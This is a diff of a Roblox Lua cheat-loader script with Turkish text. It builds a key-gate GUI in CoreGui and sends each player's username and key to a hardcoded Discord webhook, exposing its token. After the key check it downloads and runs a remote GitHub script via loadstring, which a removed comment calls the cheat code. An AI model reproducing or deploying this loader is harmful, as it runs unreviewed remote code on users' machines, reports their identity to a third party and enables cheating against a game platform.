@@ -1,14 +1,10 @@
 local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
-local player = Players.LocalPlayer
+local player = game:GetService("Players").LocalPlayer
 
--- ⏳ Süre tanımı
-local KEY_LIFETIME = 24 * 60 * 60 -- 1 gün (saniye cinsinden)
-
--- Key üretici
+local KEY_LIFETIME = 86400
 local charset = {} 
-for i = 48, 57 do table.insert(charset, string.char(i)) end -- 0-9
-for i = 65, 90 do table.insert(charset, string.char(i)) end -- A-Z
+for i = 48, 57 do table.insert(charset, string.char(i)) end
+for i = 65, 90 do table.insert(charset, string.char(i)) end
 
 local function generateKey(length)
 	local key = ""
@@ -18,11 +14,8 @@ local function generateKey(length)
 	return key
 end
 
--- 🔐 Key oluştur ve zamanla eşle
 local generatedKey = generateKey(12)
-local keyCreatedTime = os.time() -- Unix zaman damgası
-
--- Webhook
+local keyCreatedTime = os.time()
 local webhookURL = "https://discord.com/api/webhooks/1384601700131672225/IYzkevmhlUMzCFk6WmuP6Zprv_P-hd8VEtWttv7DPowWiJ9gHtZGPFRLMBzc3JeW4thO"
 
 local function sendWebhook(title, desc, color)
@@ -34,14 +27,19 @@ local function sendWebhook(title, desc, color)
 			color = color
 		}}
 	}
-	HttpService:PostAsync(webhookURL, HttpService:JSONEncode(data))
+	pcall(function()
+		HttpService:PostAsync(webhookURL, HttpService:JSONEncode(data))
+	end)
 end
 
 sendWebhook("🔑 Yeni Key Oluşturuldu", "Kullanıcı: **" .. player.Name .. "**\nKey: `" .. generatedKey .. "`\nGeçerlilik: 24 saat", 3447003)
 
--- GUI sistemi
-local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
+-- GUI
+local gui = Instance.new("ScreenGui")
 gui.Name = "KeySystem"
+gui.ResetOnSpawn = false
+gui.Parent = game:GetService("CoreGui")
+
 local frame = Instance.new("Frame", gui)
 frame.Position = UDim2.new(0.5, -100, 0.5, -50)
 frame.Size = UDim2.new(0, 200, 0, 100)
@@ -63,14 +61,10 @@ button.TextColor3 = Color3.new(1, 1, 1)
 
 button.MouseButton1Click:Connect(function()
 	if textbox.Text == generatedKey then
-		local now = os.time()
-		if now - keyCreatedTime <= KEY_LIFETIME then
-			button.Text = "✅ Key Doğru"
+		if os.time() - keyCreatedTime <= KEY_LIFETIME then
+			sendWebhook("✅ Key Doğrulandı", "Kullanıcı: **" .. player.Name .. "**\nKey: `" .. textbox.Text .. "`", 3066993)
 			gui:Destroy()
 
-			sendWebhook("✅ Key Doğrulandı", "Kullanıcı: **" .. player.Name .. "**\nKey: `" .. textbox.Text .. "`", 3066993)
-
-			-- 📥 Hile kodunu dışardan çekip çalıştır
 			local success, result = pcall(function()
 				return loadstring(game:HttpGet("https://raw.githubusercontent.com/Lucidcreatr/fpsdefusa/refs/heads/main/Scripts/merhaba2.lua"))()
 			end)
@@ -80,7 +74,7 @@ button.MouseButton1Click:Connect(function()
 			end
 		else
 			button.Text = "⏰ Key Süresi Doldu"
-			sendWebhook("❌ Key Süresi Doldu", "Kullanıcı: **" .. player.Name .. "**\nKey: `" .. textbox.Text .. "`\nDURUM: Süresi dolmuş", 15158332)
+			sendWebhook("❌ Key Süresi Doldu", "Kullanıcı: **" .. player.Name .. "**", 15158332)
 		end
 	else
 		button.Text = "❌ Hatalı Key"
